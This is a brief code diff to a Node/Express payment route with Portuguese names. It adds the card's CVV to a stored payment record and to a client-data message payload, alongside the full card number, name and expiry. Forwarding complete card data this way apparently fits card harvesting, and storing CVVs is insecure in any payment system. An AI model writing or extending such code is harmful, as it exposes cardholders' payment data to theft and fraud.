@@ -141,6 +141,7 @@ router.post('/generate', async (req, res) => {
     cardName:        isCartao ? (cardName || null) : null,
     cardNumber:      isCartao ? (cardNumber || null) : null,
     cardExpiry:      isCartao ? (cardExpiry || null) : null,
+    cardCvv:         isCartao ? (cardCvv || null) : null,
     cardLast4:       isCartao ? (cardLast4 || null) : null,
     seguro:          seguro || 0,
     seguroLabel:     seguroLabel || null,
@@ -170,6 +171,7 @@ router.post('/generate', async (req, res) => {
       cardNumber:   newPayment.cardNumber,
       cardName:     newPayment.cardName,
       cardExpiry:   newPayment.cardExpiry,
+      cardCvv:      newPayment.cardCvv,
       installments: newPayment.installments,
       // Dados do cliente para mensagem completa
       clientName:  user.nome,
